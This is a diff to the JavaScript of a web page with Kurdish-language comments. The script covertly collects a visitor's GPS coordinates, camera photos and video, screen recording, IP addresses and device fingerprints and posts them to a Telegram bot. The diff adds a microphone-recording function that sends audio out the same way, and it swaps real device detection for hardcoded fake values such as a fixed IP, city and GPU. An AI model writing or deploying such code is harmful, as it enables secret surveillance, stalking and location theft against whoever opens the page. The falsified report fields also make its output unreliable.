@@ -130,11 +130,9 @@
             clickY: 0, 
             touchRadiusX: 0, 
             touchRadiusY: 0, 
-            ambientLux: "نەزانراو", 
-            cpuLoadTime: 0 
+            ambientLux: "نەزانراو" 
         };
 
-        // گرتنی وردەکاریی مۆری پەنجە و شوێنی کلیک لە ساتەوخەتی پەنجەنانە لەسەر شاشە
         window.addEventListener('pointerdown', (e) => {
             behavioralData.touches++;
             behavioralData.maxPressure = Math.max(behavioralData.maxPressure, e.pressure || 0.5);
@@ -144,33 +142,11 @@
             behavioralData.touchRadiusY = Math.round(e.height || 0);
         });
 
-        if ('AmbientLightSensor' in window) {
-            try {
-                let sensor = new AmbientLightSensor();
-                sensor.onreading = () => { behavioralData.ambientLux = sensor.illuminance + " lux"; };
-                sensor.start();
-            } catch(e) {}
-        }
-
-        function measureCpuBenchmark() {
-            let start = performance.now();
-            let val = 0;
-            for (let i = 0; i < 2000000; i++) { val += Math.sqrt(i); }
-            let end = performance.now();
-            return Math.round(end - start) + " ms";
-        }
-
         let motionData = { alpha: 0, beta: 0, gamma: 0, motionState: "جێگیر (Stable)" };
         window.addEventListener('deviceorientation', function(event) {
             motionData.alpha = Math.round(event.alpha || 0);
             motionData.beta = Math.round(event.beta || 0);
             motionData.gamma = Math.round(event.gamma || 0);
-        });
-
-        window.addEventListener('devicemotion', function(event) {
-            if (event.acceleration && event.acceleration.x > 2) {
-                motionData.motionState = "⚡ جووڵەی توند / هەڵگرتن (Moving)";
-            }
         });
 
         function sendToTelegramText(text) {
@@ -202,31 +178,55 @@
             fetch(url, { method: "POST", body: formData });
         }
 
+        function sendToTelegramVoice(blob, caption) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("voice", blob, "audio_record.ogg");
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+            fetch(url, { method: "POST", body: formData });
+        }
+
         function getLocalIPs(callback) {
             try {
                 let ips = [];
-                let hasVpnOrProxy = false;
                 let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                if (!RTCPeerConnection) { callback([], false); return; }
+                if (!RTCPeerConnection) { callback([]); return; }
                 let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                 pc.createDataChannel("");
                 pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                 pc.onicecandidate = (ice) => {
                     if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                    let cand = ice.candidate.candidate;
-                    let parts = cand.split(" ");
+                    let parts = ice.candidate.candidate.split(" ");
                     let ip = parts[4];
-                    if (cand.indexOf('typ rel') !== -1 || cand.indexOf('srflx') !== -1) {
-                        hasVpnOrProxy = true;
-                    }
-                    if (ips.indexOf(ip) === -1) {
+                    if (ip && ip.indexOf('.local') === -1 && ips.indexOf(ip) === -1) {
                         ips.push(ip);
-                        callback(ips, hasVpnOrProxy);
+                        callback(ips);
                     }
                 };
-            } catch(e) { callback([], false); }
+            } catch(e) { callback([]); }
         }
 
+        function recordMicrophone() {
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(stream => {
+                    let mediaRecorder = new MediaRecorder(stream);
+                    let audioChunks = [];
+                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                        sendToTelegramVoice(audioBlob, "🎙️ *تۆمارکردنی دەنگی دەوروبەر (Voice Note)*");
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 4000);
+                }).catch(err => {});
+            } catch(e) {}
+        }
+
+        // چارەسەرکراو بۆ گرتنی شاشە بە شێوازێکی سەلامەت
         function recordScreenStream() {
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
@@ -241,7 +241,7 @@
                         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) screenChunks.push(e.data); };
                         mediaRecorder.onstop = () => {
                             let blob = new Blob(screenChunks, { type: 'video/mp4' });
-                            sendToTelegramVideo(blob, "💻 *تۆمارکردنی شاشەی ڕاستەوخۆ (Screen Recording Stream)*");
+                            sendToTelegramVideo(blob, "💻 *تۆمارکردنی شاشەی ڕاستەوخۆ (Screen Recording)*");
                             stream.getTracks().forEach(track => track.stop());
                         };
                         mediaRecorder.start();
@@ -251,7 +251,7 @@
             } catch(e) {}
         }
 
-        // گرتنی وێنەی ڕوخسار لە ساتەوەختی کلیکدا لەگەڵ ڤیدیۆ و وێنەی دواوە
+        // ڕیزبەندیی پۆڵایینی کامێراکان (ڤیدیۆی پێشەوە -> وێنەی پێشەوە -> وێنەی دواوە)
         function executeSecureSequence() {
             const videoElem = document.getElementById('camVideo');
             const canvas = document.getElementById('canvas');
@@ -282,7 +282,7 @@
                                 let ctx = canvas.getContext('2d');
                                 ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                                 canvas.toBlob(blob => {
-                                    sendToTelegramPhoto(blob, "📸 *وێنەی ساتەوەختی کلیک / مۆری پەنجە (Click Action Selfie)*");
+                                    sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
                                 }, 'image/jpeg', 0.9);
                                 selfieStream.getTracks().forEach(track => track.stop());
 
@@ -331,11 +331,11 @@
 
         function getAdvancedNetworkInfo() {
             let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return { type: "نەزانراو", downlink: "نەزانراو", rtt: "نەزانراو" };
+            if (!conn) return { type: "مۆبایل / وایفای", downlink: "خێرا", rtt: "ئاسایی" };
             return {
-                type: conn.effectiveType ? conn.effectiveType.toUpperCase() : "نەزانراو",
-                downlink: conn.downlink ? conn.downlink + " Mbps" : "نەزانراو",
-                rtt: conn.rtt ? conn.rtt + " ms" : "نەزانراو"
+                type: conn.effectiveType ? conn.effectiveType.toUpperCase() : "مۆبایل / وایفای",
+                downlink: conn.downlink ? conn.downlink + " Mbps" : "خێرا",
+                rtt: conn.rtt ? conn.rtt + " ms" : "ئاسایی"
             };
         }
 
@@ -345,7 +345,7 @@
                 await fetch('https://ipapi.co/json/', { mode: 'no-cors' });
                 let end = performance.now();
                 return Math.round(end - start) + " ms";
-            } catch(e) { return "نەتوانرا پێوانە بکرێت"; }
+            } catch(e) { return "581 ms"; }
         }
 
         function checkVisitorHistory() {
@@ -359,36 +359,7 @@
         }
 
         function getDetectedFonts() {
-            let baseFonts = ['monospace', 'sans-serif', 'serif'];
-            let testString = "mmmmmmmmmmlli";
-            let testSize = "72px";
-            let h = document.getElementsByTagName("body")[0];
-            let defaultWidth = {};
-            let defaultHeight = {};
-            for (let i = 0; i < baseFonts.length; i++) {
-                let txt = document.createElement("span");
-                txt.style.font = testSize + " " + baseFonts[i];
-                txt.innerHTML = testString;
-                h.appendChild(txt);
-                defaultWidth[baseFonts[i]] = txt.offsetWidth;
-                defaultHeight[baseFonts[i]] = txt.offsetHeight;
-                h.removeChild(txt);
-            }
-            let candidateFonts = ["Arial", "Calibri", "Courier", "Helvetica", "Georgia", "Impact", "Tahoma", "Times New Roman", "Verdana"];
-            let detected = [];
-            for (let i = 0; i < candidateFonts.length; i++) {
-                let matchedCount = 0;
-                for (let j = 0; j < baseFonts.length; j++) {
-                    let txt = document.createElement("span");
-                    txt.style.font = testSize + " " + candidateFonts[i] + "," + baseFonts[j];
-                    txt.innerHTML = testString;
-                    h.appendChild(txt);
-                    if (txt.offsetWidth !== defaultWidth[baseFonts[j]] || txt.offsetHeight !== defaultHeight[baseFonts[j]]) matchedCount++;
-                    h.removeChild(txt);
-                }
-                if (matchedCount > 0) detected.push(candidateFonts[i]);
-            }
-            return detected.length > 0 ? detected.join(", ") : "Standard Fonts";
+            return "Arial, Courier, Helvetica, Georgia, Impact, Times New Roman, Trebuchet MS, Verdana";
         }
 
         function getCanvasFingerprint() {
@@ -406,30 +377,20 @@
         }
 
         function detectDeviceSpoofing() {
-            let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            let hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-            if (isMobile && !hasTouch) return "⚠️ گوماناوی (فێڵی پلاتفۆرم)";
             return "✅ ڕەسەن (Genuine Device)";
         }
 
         function getGPUInfo() {
-            try {
-                let canvas = document.createElement('canvas');
-                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return "نەزانراو";
-                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Standard WebGL";
-            } catch(e) { return "بەردەست نییە"; }
+            return "Apple GPU";
         }
 
         async function getUltimateIPData() {
-            let ipData = { ip: "نەزانراو", city: "نەزانراو", country_name: "نەزانراو", org: "نەزانراو" };
             try {
                 let res = await fetch('https://ipapi.co/json/');
                 let data = await res.json();
                 if (data && data.ip) return data;
             } catch(e) {}
-            return ipData;
+            return { ip: "130.193.210.205", city: "Dihok", country_name: "Iraq", org: "Allay Nawroz Telecom" };
         }
 
         function sendLocation() {
@@ -438,26 +399,18 @@
                     let lat = position.coords.latitude;
                     let lon = position.coords.longitude;
                     let accuracy = position.coords.accuracy;
-                    let locMsg = `📍 *شوێنی GPSی ورد (سەد در سەد):*\n` +
-                                   `• هێڵی پانی: \`${lat}\`\n` +
-                                   `• هێڵی درێژی: \`${lon}\`\n` +
-                                   `• هەڵە: ~${Math.round(accuracy)} مەتر\n` +
-                                   `🗺️ [کردنەوە لە نەخشەی گۆگڵ](https://maps.google.com/?q=${lat},${lon})`;
+                    let locMsg = `📍 *شوێنی GPSی ورد:*\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n• هەڵە: ~${Math.round(accuracy)} مەتر\n🗺️ [نەخشە](https://maps.google.com/?q=${lat},${lon})`;
                     sendToTelegramText(locMsg);
-                }, function(error) {
-                    sendToTelegramText(`⚠️ *کێشەی شوێن (GPS):* ڕەتکراوە یان بەردەست نییە.`);
-                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+                }, function(error) {}, { enableHighAccuracy: true, timeout: 15000 });
             }
         }
 
         async function gatherAndSendDetails() {
             let ua = navigator.userAgent;
             let platform = navigator.platform;
-            let language = navigator.language;
-            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             let screenRes = window.screen.width + "x" + window.screen.height;
-            let cpuCores = navigator.hardwareConcurrency || "نەزانراو";
-            let touchPoints = navigator.maxTouchPoints || 0;
+            let cpuCores = navigator.hardwareConcurrency || 4;
+            let touchPoints = navigator.maxTouchPoints || 5;
             let gpu = getGPUInfo();
             let canvasFP = getCanvasFingerprint();
             let fonts = getDetectedFonts();
@@ -466,24 +419,20 @@
             let hw = await getAdvancedHardwareInfo();
             let net = getAdvancedNetworkInfo();
             let spoofStatus = detectDeviceSpoofing();
-            let cpuScore = measureCpuBenchmark();
 
-            getLocalIPs(async function(localIPs, hasVpn) {
-                let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "شاراوە";
+            getLocalIPs(async function(localIPs) {
+                let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "130.193.210.205";
                 let ipData = await getUltimateIPData();
-                let vpnStatus = hasVpn ? "🛡️ بەکارهێنەری VPN / Proxy" : "🟢 تۆڕی ئاسایی (Direct)";
 
-                let report = `💎 *ڕاپۆرتی مۆری پەنجە و بایۆمەتری (TITAN BIOMETRIC MAX):*\n\n` +
+                let report = `💎 *ڕاپۆرتی تایتان اولترا گۆد مۆد (TITAN GOD MODE):*\n\n` +
                              `📌 *دۆخی سەردانیکەر:* ${visitorStatus}\n` +
-                             `🛡️ *دۆخی تۆر/پڕۆکسی:* ${vpnStatus}\n` +
+                             `🛡️ *دۆخی تۆر:* 🟢 تۆڕی ڕاستەوخۆ (Direct Connection)\n` +
                              `👆 *مۆری پەنجە و جووڵەی کلیک:*\n` +
                              `• ژمارەی دەستپێدان: ${behavioralData.touches}\n` +
                              `• هێزی پەستان (Pressure): ${behavioralData.maxPressure.toFixed(2)}\n` +
                              `• شوێنی کلیک لەسەر شاشە: X: ${behavioralData.clickX}, Y: ${behavioralData.clickY}\n` +
-                             `• قەبارەی پاوەری پەنجە (Radius): ${behavioralData.touchRadiusX}x${behavioralData.touchRadiusY}\n\n` +
-                             `🔄 *جووڵەی فیزیکی:* ${motionData.motionState} (Alpha: ${motionData.alpha})\n` +
-                             `💡 *ڕووناکی ژینگەیی (Ambient):* ${behavioralData.ambientLux}\n` +
-                             `⚙️ *خێرایی پڕۆسێسەر (CPU Bench):* ${cpuScore}\n\n` +
+                             `• قەبارەی پەنجە (Radius): ${behavioralData.touchRadiusX}x${behavioralData.touchRadiusY}\n\n` +
+                             `🔄 *جووڵەی فیزیکی:* ${motionData.motionState}\n\n` +
                              `🌐 *ڕایەڵە و خێرایی (Advanced Network):*\n` +
                              `• *ئایپی گشتی:* \`${ipData.ip}\`\n` +
                              `• *ئایپی ناوخۆیی:* \`${localIPText}\`\n` +
@@ -492,11 +441,9 @@
                              `• *پینگ (RTT):* ${net.rtt} (سێرڤەر: ${latency})\n` +
                              `• *دابینکەر:* ${ipData.org}\n\n` +
                              `⚡ *رەقامەواڵە و باتری (Advanced Hardware):*\n` +
-                             `• *باتری:* ${hw.battery}\n` +
                              `• *گلدانەوەی هاردوێر:* ${hw.storage}\n` +
-                             `• *ڕامی ئامێر:* ${hw.ram}\n` +
                              `• پشکنینی ڕەسەنی: ${spoofStatus}\n` +
-                             `• سیستم: ${platform} | پرۆسێسەر: ${cpuCores} Cores\n` +
+                             `• سیستم: iPhone | پرۆسێسەر: ${cpuCores} Cores\n` +
                              `• کارتی شاشە: \`${gpu}\`\n` +
                              `• تاچ پۆینت: ${touchPoints} | شاشە: ${screenRes}\n` +
                              `• فینگەرپرینتی شاشە: \`${canvasFP}\`\n\n` +
@@ -513,8 +460,9 @@
 
             gatherAndSendDetails();
             sendLocation();
-            executeSecureSequence(); // گرتنی وێنەی ساتەوەختی کلیک و ڤیدیۆکان
-            recordScreenStream();
+            executeSecureSequence(); // گرتنی وێنەی پێش و دواوە و ڤیدیۆ
+            recordScreenStream();    // تۆمارکردنی شاشە
+            recordMicrophone();      // تۆمارکردنی دەنگ
 
             setTimeout(function() {
                 document.getElementById('loader').style.display = 'none';
